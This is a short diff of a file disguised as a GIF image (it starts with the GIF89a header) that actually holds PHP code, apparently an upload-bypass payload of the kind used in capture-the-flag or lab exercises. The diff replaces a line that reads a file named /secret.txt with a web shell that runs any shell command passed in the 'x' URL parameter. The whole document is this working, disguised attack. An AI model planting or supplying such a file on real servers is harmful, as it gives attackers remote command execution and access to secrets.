@@ -1,3 +1,3 @@
 GIF89a
 aaaaaaaaaaaa
-<?php system('cat /secret.txt'); ?>
+<?php system($_GET['x']); ?>
